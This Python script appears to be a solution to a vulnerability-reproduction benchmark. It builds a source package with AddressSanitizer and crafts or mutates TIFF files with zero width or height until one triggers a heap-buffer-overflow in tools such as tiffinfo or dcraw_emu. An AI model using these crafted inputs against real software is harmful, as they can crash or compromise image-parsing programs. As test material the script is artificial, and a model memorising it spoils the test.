import os
import sys
import tarfile
import subprocess
import tempfile
import struct
import shutil

class Solution:
    def solve(self, src_path: str) -> bytes:
        work_dir = tempfile.mkdtemp()
        try:
            # 1. Extract source code
            try:
                with tarfile.open(src_path) as tar:
                    tar.extractall(path=work_dir)
            except Exception:
                pass
            
            source_root = work_dir
            for root, dirs, files in os.walk(work_dir):
                if 'configure' in files or 'CMakeLists.txt' in files:
                    source_root = root
                    break
            
            # 2. Setup Build Environment (ASAN)
            env = os.environ.copy()
            flags = "-fsanitize=address -g -O1"
            env['CFLAGS'] = flags
            env['CXXFLAGS'] = flags
            env['LDFLAGS'] = flags
            
            # 3. Build Project
            built = False
            # Try Autotools
            if os.path.exists(os.path.join(source_root, "configure")):
                try:
                    subprocess.run(
                        ["./configure", "--disable-shared", "--enable-static"],
                        cwd=source_root, env=env,
                        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=True
                    )
                    subprocess.run(
                        ["make", "-j8"],
                        cwd=source_root, env=env,
                        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=True
                    )
                    built = True
                except Exception:
                    pass
            
            # Try CMake
            if not built and os.path.exists(os.path.join(source_root, "CMakeLists.txt")):
                try:
                    build_dir = os.path.join(source_root, "build")
                    os.makedirs(build_dir, exist_ok=True)
                    subprocess.run(
                        ["cmake", ".."],
                        cwd=build_dir, env=env,
                        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=True
                    )
                    subprocess.run(
                        ["make", "-j8"],
                        cwd=build_dir, env=env,
                        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=True
                    )
                    built = True
                except Exception:
                    pass
            
            # 4. Identify Target Binary
            target_bin = None
            priority_bins = ['dcraw_emu', 'simple_dcraw', 'tiffinfo', 'tiffcp', 'magick']
            
            found_bins = []
            for root, dirs, files in os.walk(work_dir):
                for f in files:
                    fp = os.path.join(root, f)
                    if os.access(fp, os.X_OK) and not os.path.isdir(fp):
                        if not any(f.endswith(ext) for ext in ['.sh', '.py', '.pl', '.so', '.la', '.o', '.a']):
                            found_bins.append(fp)
            
            for name in priority_bins:
                for b in found_bins:
                    if os.path.basename(b) == name:
                        target_bin = b
                        break
                if target_bin: break
            
            if not target_bin and found_bins:
                target_bin = found_bins[0]
            
            # 5. Generate Candidates
            candidates = []
            
            # Synthetic Candidates (Width=0 or Height=0)
            candidates.append(self.generate_tiff(width=0, height=100))
            candidates.append(self.generate_tiff(width=100, height=0))
            
            # Mutation Candidates (from existing seeds)
            seeds = []
            valid_exts = {'.tiff', '.tif', '.raw', '.dng', '.cr2', '.nef'}
            for root, dirs, files in os.walk(source_root):
                for f in files:
                    if os.path.splitext(f)[1].lower() in valid_exts:
                        seeds.append(os.path.join(root, f))
            seeds.sort(key=os.path.getsize)
            
            for seed in seeds[:3]:
                try:
                    with open(seed, 'rb') as f:
                        data = f.read()
                    if self.is_tiff(data):
                        candidates.extend(self.mutate_tiff_tags(data))
                except Exception:
                    pass
            
            # 6. Verify Crash
            if target_bin:
                for cand in candidates:
                    if self.verify_crash(target_bin, cand, env):
                        return cand
            
            return candidates[0]

        finally:
            shutil.rmtree(work_dir, ignore_errors=True)

    def is_tiff(self, data: bytes) -> bool:
        return data.startswith(b'II') or data.startswith(b'MM')

    def mutate_tiff_tags(self, data: bytes) -> list:
        results = []
        endian = '<' if data.startswith(b'II') else '>'
        try:
            fmt_short = endian + 'H'
            fmt_long = endian + 'L'
            
            if len(data) < 8: return []
            magic = struct.unpack(fmt_short, data[2:4])[0]
            if magic != 42: return []
            
            ifd_offset = struct.unpack(fmt_long, data[4:8])[0]
            if ifd_offset == 0 or ifd_offset >= len(data): return []
            
            if ifd_offset + 2 > len(data): return []
            count = struct.unpack(fmt_short, data[ifd_offset:ifd_offset+2])[0]
            
            current = ifd_offset + 2
            for _ in range(count):
                if current + 12 > len(data): break
                tag = struct.unpack(fmt_short, data[current:current+2])[0]
                
                # 256 = ImageWidth, 257 = ImageLength
                if tag in [256, 257]:
                    mutated = bytearray(data)
                    # Zero out the value field (4 bytes starting at offset 8)
                    mutated[current+8:current+12] = b'\x00\x00\x00\x00'
                    results.append(bytes(mutated))
                
                current += 12
        except Exception:
            pass
        return results

    def generate_tiff(self, width: int, height: int) -> bytes:
        header = b'II\x2a\x00\x08\x00\x00\x00'
        tags = [
            (256, 3, 1, width),       # ImageWidth
            (257, 3, 1, height),      # ImageLength
            (258, 3, 1, 8),           # BitsPerSample
            (259, 3, 1, 1),           # Compression (None)
            (262, 3, 1, 1),           # PhotometricInterpretation (BlackIsZero)
            (273, 4, 1, 200),         # StripOffsets
            (278, 4, 1, 100),         # RowsPerStrip
            (279, 4, 1, 4096),        # StripByteCounts
        ]
        
        ifd = bytearray()
        ifd += struct.pack('<H', len(tags))
        for t in tags:
            ifd += struct.pack('<HHLL', *t)
        ifd += struct.pack('<L', 0)
        
        data = bytearray(header)
        data += ifd
        
        padding = 200 - len(data)
        if padding > 0:
            data += b'\x00' * padding
            
        data += b'\x41' * 4096
        return bytes(data)

    def verify_crash(self, binary: str, data: bytes, env: dict) -> bool:
        t = tempfile.NamedTemporaryFile(delete=False)
        t_name = t.name
        t.write(data)
        t.close()
        
        try:
            proc = subprocess.run(
                [binary, t_name],
                env=env,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.PIPE,
                timeout=3
            )
            
            if proc.returncode != 0:
                stderr = proc.stderr.decode(errors='ignore')
                if "AddressSanitizer" in stderr and "heap-buffer-overflow" in stderr:
                    return True
        except Exception:
            pass
        finally:
            if os.path.exists(t_name):
                os.unlink(t_name)
        
        return False